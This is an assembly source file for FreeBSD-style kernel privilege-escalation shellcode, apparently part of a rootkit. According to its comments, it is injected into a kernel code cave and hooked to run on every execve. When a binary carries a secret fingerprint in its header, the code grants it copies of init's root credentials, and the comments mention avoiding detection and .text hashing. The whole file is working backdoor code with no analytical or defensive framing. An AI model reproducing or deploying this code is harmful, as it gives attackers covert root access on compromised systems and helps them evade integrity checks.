/* 
privesc shellcode.

this is injected into a kernelspace codecave. 
maybe itll be improved to defend against .text hashing soon idk

we register a process_exec ehook so this fires every execve. read new.md
for more details on the idea on this "technique"


fix: cred refcount
new fix: actually, dont even do that just crdup it so it doenst look sus

fuck this beautifier

*/
.intel_syntax noprefix
.text
.globl roflcopter
.type roflcopter, @function

roflcopter:
	push rbx
	push r12
	push r13
	push r14

	test	rdx, rdx
	jz	.allgood

	/* r12 is imgp.image_header*/
	mov	r12, [rdx + 40]
	test r12, r12
	jz	.allgood

	/* cmp 16 bytes at imghdr+fp_offset */
	mov	rax, [r12 + FP_OFFSET]
	mov	rcx, [r12 + FP_OFFSET + 8]
	movabs r13, FP_LO
	movabs r14, FP_HI
	cmp	rax, r13
	jne	.allgood
	cmp	rcx, r14
	jne	.allgood


	/* save imgp to r12 */
	mov	r12, rdx

	/* r13 = initproc (deref the pointer symbol) */
	movabs	r13, INITPROC_ADDR
	mov	r13, [r13]

	/* r13 = initproc->p_ucred (offset 64) */
	mov	r13, [r13 + 64]

	/* rax = crdup(initproc.p_ucred) */
	mov	rdi, r13
	sub	rsp, 8
	movabs rax, CRDUP_ADDR
	call rax
	add	rsp, 8
	test rax, rax
	jz .allgood

	/* imgp.newcred = rax (+200) */
	mov	[r12 + 200], rax

	/* imgp.credential_setid = true (+209)*/
	mov	byte ptr [r12 + 209], 1

.allgood:
	pop	r14
	pop	r13
	pop	r12
	pop	rbx
	ret

.size roflcopter, . - roflcopter
